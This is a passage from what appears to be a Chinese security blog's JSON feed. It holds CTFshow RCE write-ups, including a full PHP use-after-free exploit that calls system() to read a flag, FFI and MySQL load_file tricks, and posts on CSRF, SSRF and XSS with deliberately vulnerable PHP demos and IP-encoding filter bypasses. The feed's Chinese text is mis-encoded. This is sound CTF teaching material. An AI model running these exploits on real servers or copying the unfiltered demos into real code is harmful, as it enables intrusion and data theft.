3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#39;WIN&#39;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#39;This%20PoC%20is%20for%20*nix%20systems%20only.&#39;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%0A%20%20%20%20trigger_uaf(&#39;x&#39;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#39;args&#39;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121909286.png\" alt=\"image-20221101121909286\" /></p>\n<h2 id=\"web75\"><a class=\"anchor\" href=\"#web75\">#</a> web75</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c=?><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glob:///*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>çœ‹åˆ° flag åœ¨ flag36 é‡Œ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101122250381.png\" alt=\"image-20221101122250381\" /></p>\n<p>åˆæ¥ã€‚ã€‚ä½†æ˜¯ UAF ä¹Ÿä¸èƒ½ç”¨äº†</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101122350518.png\" alt=\"image-20221101122350518\" /></p>\n<p>ç”¨æ•°æ®åº“å»è¯»å–æ–‡ä»¶</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c<span class=\"token operator\">=</span><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PDO</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mysql:host=localhost;dbname=ctftraining'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dbh</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select load_file(\"/flag36.txt\")'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token variable\">$dbh</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">PDOException</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-></span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101123147447.png\" alt=\"image-20221101123147447\" /></p>\n<h2 id=\"web77\"><a class=\"anchor\" href=\"#web77\">#</a> web77</h2>\n<p>ä¸Šé¢çš„æ–¹æ³•éƒ½ ban äº†ï¼Œä½¿ç”¨ FFI</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c<span class=\"token operator\">=</span><span class=\"token variable\">$ffi</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">FFI</span><span class=\"token operator\">::</span><span class=\"token function\">cdef</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"int system(const char *command);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'/readflag > 1.txt'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ffi</span><span class=\"token operator\">-></span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>å†å»è®¿é—® 1.txt å³å¯</p>\n",
            "tags": [
                "CTFshow",
                "rce"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/31/CSRF&SSRF/",
            "url": "https://blog.xcu.icu/2022/10/31/CSRF&SSRF/",
            "title": "CSRF&SSRF",
            "date_published": "2022-10-30T16:00:00.000Z",
            "content_html": "<h2 id=\"csrfç®€ä»‹\"><a class=\"anchor\" href=\"#csrfç®€ä»‹\">#</a> CSRF ç®€ä»‹</h2>\n<p>CSRF æ˜¯æŒ‡è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆè‹±è¯­ï¼šCross-site request forgeryï¼Œä¹Ÿè¢«ç§°ä¸º [one-click attack] æˆ–è€… [session riding]ï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRFï¼Œæ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„ Web åº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚è·Ÿè·¨ç½‘ç«™è„šæœ¬ï¼ˆXSSï¼‰ç›¸æ¯”ï¼ŒXSS åˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»ã€‚</p>\n<p>æ‰¯é‚£ä¹ˆå¤šï¼Œç®€å•çš„ç†è§£å°±æ˜¯ç›—ç”¨äº†ç”¨æˆ·çš„èº«ä»½ï¼Œä»¥ç”¨æˆ·çš„åä¹‰è¿›è¡Œéæ³•æ“ä½œ</p>\n<h2 id=\"csrfçš„å·¥ä½œåŸç†\"><a class=\"anchor\" href=\"#csrfçš„å·¥ä½œåŸç†\">#</a> CSRF çš„å·¥ä½œåŸç†</h2>\n<p>å½“æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªç½‘ç«™åï¼Œæˆ‘ä»¬çš„æµè§ˆå™¨ä¼šä¸æœåŠ¡å™¨äº§ç”Ÿä¸€ä¸ªä¼šè¯ï¼Œåœ¨è¿™ä¸ªä¼šè¯ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸çš„ä½¿ç”¨æˆ‘ä»¬çš„æƒé™å¯¹ç½‘ç«™è¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚ç™»å½•åšå®¢å¯ä»¥åˆ é™¤æˆ–å‘å¸ƒæ–‡ç« ï¼Œå½“ä¼šè¯ç»“æŸåï¼Œå†è¿›è¡Œè¿™äº›æ“ä½œæ—¶å°±ä¼šæç¤ºä¼šè¯è¿‡æœŸè¯·é‡æ–°ç™»å½•ã€‚</p>\n<p>ä¸Šè¿°æ˜¯æˆ‘ä»¬æ­£å¸¸çš„ä¸€ä¸ªä¼šè¯è¿‡ç¨‹ï¼Œè€Œ CSRF å°±æ˜¯å»ºç«‹åœ¨ä¼šè¯ä¸Šï¼Œæ¯”å¦‚æˆ‘ä»¬ç™»å½•ç½‘ä¸Šé“¶è¡Œè½¬è´¦çš„è¿‡ç¨‹ä¸­ï¼Œç‚¹å‡»äº†ä¸€ä¸ªæ”»å‡»è€…æ„é€ çš„ä¸€ä¸ªè½¬è´¦ä¸šåŠ¡ä»£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬è´¦å·ä¸­çš„ä½™é¢å°±ä¼šè¢«ç›—èµ°ï¼Œä¸€ç›´åˆ°ç°åœ¨è¯´çš„éƒ½æ˜¯ CSRF çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Œåœ¨æµè§ˆå™¨ä¸æœåŠ¡å™¨çš„ä¼šè¯ä¸­æ‰€æœ‰çš„æ“ä½œéƒ½è¢«é»˜è®¤ä¸ºæ˜¯å¯ä¿¡çš„æ‰€ä»¥æ‰§è¡Œäº†æ”»å‡»è€…æ„å»ºçš„è½¬è´¦ä»£ç </p>\n<h3 id=\"æ¼æ´å½¢æˆæ¡ä»¶\"><a class=\"anchor\" href=\"#æ¼æ´å½¢æˆæ¡ä»¶\">#</a> æ¼æ´å½¢æˆæ¡ä»¶</h3>\n<ol>\n<li>CSRF æ”»å‡»å»ºç«‹åœ¨ä¼šè¯ä¸‹</li>\n<li>æ¬ºéª—ç”¨æˆ·è®¿é—® url</li>\n</ol>\n<h2 id=\"csrfæ”»å‡»\"><a class=\"anchor\" href=\"#csrfæ”»å‡»\">#</a> CSRF æ”»å‡»</h2>\n<p>CSRF æ”»å‡»æ˜¯æ”»å‡»è€…é€šè¿‡å—å®³è€…çš„ cookie éª—å–æœåŠ¡å™¨çš„ä¿¡ä»»ï¼Œä½†æ˜¯æ”»å‡»è€…å¹¶æ²¡æœ‰è·å–åˆ° Cookieï¼Œä¹Ÿçœ‹ä¸åˆ° Cookie ä¿¡æ¯ã€‚å¦å¤–ï¼Œç”±äºæµè§ˆå™¨åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œé»‘å®¢æ— æ³•ä»è¿”å›çš„ç»“æœä¸­å¾—åˆ°ä»»ä½•ä¿¡æ¯ï¼ŒCSRF æ‰€èƒ½åšçš„å°±æ˜¯ç»™æœåŠ¡å™¨å‘é€è¯·æ±‚</p>\n<h2 id=\"csrfé˜²å¾¡\"><a class=\"anchor\" href=\"#csrfé˜²å¾¡\">#</a> CSRF é˜²å¾¡</h2>\n<p>CSRF æ¼æ´çš„é¢„é˜²æ²¡æœ‰å…¶ä»–æ¼æ´é‚£ä¹ˆéº»çƒ¦ï¼Œåªéœ€è¦åœ¨ä¸€äº›åœ°æ–¹å¢åŠ ä¸€äº›å°æ“ä½œå°±å¥½</p>\n<h3 id=\"äºŒæ¬¡ç¡®è®¤tokenéªŒè¯\"><a class=\"anchor\" href=\"#äºŒæ¬¡ç¡®è®¤tokenéªŒè¯\">#</a> äºŒæ¬¡ç¡®è®¤ &amp; token éªŒè¯</h3>\n<p>åœ¨è°ƒç”¨æŸäº›åŠŸèƒ½æ—¶è¿›è¡ŒäºŒæ¬¡éªŒè¯ï¼Œæ¯”å¦‚åˆ é™¤ç”¨æˆ·æ—¶ï¼Œäº§ç”Ÿæç¤ºå¯¹è¯æ¡†ï¼Œéœ€è¦äºŒæ¬¡ç¡®è®¤ï¼Œå†å¦‚è½¬è´¦æ—¶éœ€è¦å†æ¬¡è¾“å…¥å¯†ç </p>\n<h2 id=\"ssrfç®€ä»‹\"><a class=\"anchor\" href=\"#ssrfç®€ä»‹\">#</a> SSRF ç®€ä»‹</h2>\n<p>å¤šæ•° web åº”ç”¨éƒ½æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œæ ¹æ®ç”¨æˆ·æŒ‡å®šçš„ url æ¥ä¸‹è½½æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶ç­‰ã€‚å¦‚æœè¿™ç§åŠŸèƒ½è¢«æ¶æ„åˆ©ç”¨ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½å¯¼è‡´å­˜åœ¨ç¼ºé™·çš„ web åº”ç”¨è¢«ä½œä¸ºè·³æ¿å»æ”»å‡»æœ¬åœ°æˆ–è€…è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿™ç§å½¢å¼çš„æ”»å‡»è¢«ç§°ä¸º SSRF</p>\n<h2 id=\"ssrfå½¢æˆåŸç†\"><a class=\"anchor\" href=\"#ssrfå½¢æˆåŸç†\">#</a> SSRF å½¢æˆåŸç†</h2>\n<p>SSRF çš„ä¸»è¦å½¢æˆåŸç†æ˜¯æœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤æˆ–è€…é™åˆ¶å¯¼è‡´çš„ã€‚</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>åŸæœ¬æ˜¯ç”¨æ¥è·å–å›¾ç‰‡è¿”å›ç»™ç”¨æˆ·çš„ï¼Œä½†æ˜¯æ„é€ </p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>å°±å¯ä»¥æ¢æµ‹ 8000 ç«¯å£çš„å¼€æ”¾æƒ…å†µ</p>\n<h2 id=\"é˜²æŠ¤ç»•è¿‡\"><a class=\"anchor\" href=\"#é˜²æŠ¤ç»•è¿‡\">#</a> é˜²æŠ¤ç»•è¿‡</h2>\n<p>é˜²æŠ¤ä¸»è¦æ˜¯å¯¹è¯·æ±‚è¿›è¡Œè¿‡æ»¤</p>\n<ol>\n<li>è®¾ç½®ç™½åå•</li>\n<li>ç¦æ­¢è¯·æ±‚å†…ç½‘ ip</li>\n</ol>\n<p>ç»•è¿‡ä¹Ÿä¸éš¾</p>\n<ol>\n<li>ä½¿ç”¨ http://example.com@eval.com è¿™ç§æ ¼å¼ç»•è¿‡æ­£åˆ™</li>\n<li>ä½¿ç”¨å…¶ä»–è¿›åˆ¶ï¼Œæˆ–è€…æ˜¯ç®€å†™ ip\n<ul>\n<li>0177.00.00.01ï¼ˆå…«è¿›åˆ¶ï¼‰</li>\n<li>2130706433 (åè¿›åˆ¶)</li>\n<li>0x7f.0x0.0x0.1x0.0x1ï¼ˆåå…­è¿›åˆ¶ï¼‰</li>\n<li>127.1</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"åˆ©ç”¨\"><a class=\"anchor\" href=\"#åˆ©ç”¨\">#</a> åˆ©ç”¨</h2>\n<h3 id=\"ç«¯å£æ‰«æ\"><a class=\"anchor\" href=\"#ç«¯å£æ‰«æ\">#</a> ç«¯å£æ‰«æ</h3>\n<p>è®¿é—®å†…ç½‘ ip åŠ ç«¯å£å·ï¼Œæ ¹æ®å“åº”æ—¶é—´å›æ˜¾æ¥åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾</p>\n<h3 id=\"æŒ‡çº¹è¯†åˆ«\"><a class=\"anchor\" href=\"#æŒ‡çº¹è¯†åˆ«\">#</a> æŒ‡çº¹è¯†åˆ«</h3>\n<p>å¤§éƒ¨åˆ† web åº”ç”¨æœ‰ä¸€äº›ç‹¬ç‰¹çš„æ–‡ä»¶æˆ–è€…ç›®å½•ï¼Œå¯ä»¥é€šè¿‡è¿™äº›ç‰¹å¾æ¥åˆ¤æ–­åº”ç”¨ç±»å‹ï¼Œè¯¦ç»†ç‰ˆæœ¬ï¼Œä»¥æ­¤æ›´å¥½çš„è¿›è¡Œæ¼æ´åˆ©ç”¨</p>\n<h3 id=\"æ–‡ä»¶è¯»å–\"><a class=\"anchor\" href=\"#æ–‡ä»¶è¯»å–\">#</a> æ–‡ä»¶è¯»å–</h3>\n<p>é…åˆ file ä¼ªåè®®ï¼Œå¯ä»¥è¯»å–æ•æ„Ÿæ–‡ä»¶</p>\n",
            "tags": [
                "Web",
                "web"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/29/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/",
            "url": "https://blog.xcu.icu/2022/10/29/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/",
            "title": "XSSè·¨ç«™è„šæœ¬æ”»å‡»",
            "date_published": "2022-10-28T16:00:00.000Z",
            "content_html": "<h1 id=\"xssè·¨ç«™è„šæœ¬æ”»å‡»\"><a class=\"anchor\" href=\"#xssè·¨ç«™è„šæœ¬æ”»å‡»\">#</a> XSS è·¨ç«™è„šæœ¬æ”»å‡»</h1>\n<p>xss ä¹Ÿå« css ä¸ºäº†å’Œå±‚å æ ·å¼è¡¨ï¼ˆCascading Style Sheetsï¼ŒCSSï¼‰çš„ç¼©å†™åŒºåˆ†ã€‚å› æ­¤å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸º XSSã€‚</p>\n<p>xss æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…åœ¨ç½‘é¡µä¸­åµŒå…¥å®¢æˆ·ç«¯è„šæœ¬ï¼Œé€šå¸¸æ˜¯ js ä»£ç ï¼Œåœ¨ç”¨æˆ·è®¿é—®æ—¶ï¼Œæ¶æ„ä»£ç æ‰§è¡Œ</p>\n<h1 id=\"åŸç†åˆ¨æ\"><a class=\"anchor\" href=\"#åŸç†åˆ¨æ\">#</a> åŸç†åˆ¨æ</h1>\n<p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸€äº›æ–¹å¼å‘ç½‘é¡µä¸­å†™å…¥æ¶æ„ä»£ç ï¼Œå¯¼è‡´ç”¨æˆ·åœ¨åŠ è½½ç½‘é¡µæ—¶æµè§ˆå™¨æ¸²æŸ“æ‰§è¡Œäº†æ¶æ„è„šæœ¬</p>\n<p>ä¸Šé¢æåˆ° xss æ”»å‡»æ˜¯åµŒå…¥å®¢æˆ·ç«¯è„šæœ¬ï¼Œå¤§å¤šæ•°æ˜¯ jsï¼Œå°‘éƒ¨åˆ†ä½¿ç”¨ AS å’Œ VBSï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´åœ¨èƒ½å¤Ÿåˆ©ç”¨æ¼æ´çš„æƒ…å†µä¸‹ï¼Œjs èƒ½åšåˆ°ä»€ä¹ˆæ•ˆæœï¼Œxss çš„åˆ©ç”¨å°±èƒ½åšåˆ°ä»€ä¹ˆæ•ˆæœ</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">javaScriptåŠ è½½å¤–éƒ¨çš„ä»£ç æ–‡ä»¶å¯ä»¥æ˜¯ä»»æ„æ–‡ä»¶æ‰©å±•åï¼Œå³ä½¿æ˜¯å›¾ç‰‡æ‰©å±•ååªè¦åŒ…å«jsä»£ç å°±èƒ½æ‰§è¡Œ<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h1 id=\"xssåˆ†ç±»\"><a class=\"anchor\" href=\"#xssåˆ†ç±»\">#</a> xss åˆ†ç±»</h1>\n<p>ä¸»è¦è¢«åˆ†ä¸ºä¸‰ç§ï¼Œåå°„å‹ï¼Œå‚¨å­˜å‹å’Œ DOM å‹ï¼Œæ¥ä¸‹æ¥è¯¦ç»†è¯´æ˜</p>\n<h3 id=\"åå°„å‹\"><a class=\"anchor\" href=\"#åå°„å‹\">#</a> åå°„å‹</h3>\n<p>é¦–å…ˆï¼Œå…ˆç›—ä¸ªå›¾</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025215134992.png\" alt=\"image-20221025215134992\" /></p>\n<p>åå°„å‹ xss ä¹Ÿè¢«ç§°ä¸ºéæŒä¹…å‹çš„ xssï¼Œåå°„å‹ xss æ˜¯å½“å…ˆæœ€å¸¸è§çš„ä¸€ç§ xss æ¼æ´ã€‚æ”»å‡»è€…å°†å¸¦æœ‰ xss æ¶æ„è„šæœ¬çš„è¿æ¥å‘ç»™ç”¨æˆ·è¯±å¯¼å…¶ç‚¹å‡»ï¼Œç”¨æˆ·å‘æœåŠ¡å™¨è¯·æ±‚äº†ä¸€ä¸ªå¸¦æœ‰ xss è„šæœ¬çš„ url è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æ xss è„šæœ¬åŒºè®¿é—®äº†æ¶æ„æœåŠ¡å™¨é€ æˆæ¼æ´</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hello <span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>æœåŠ¡ç«¯å¯¹ç”¨æˆ·çš„ name æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼ŒæœåŠ¡å™¨è§£æåé€šè¿‡ echo æ’å…¥åˆ° HTML ä¸­</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025221057624.png\" alt=\"image-20221025221057624\" 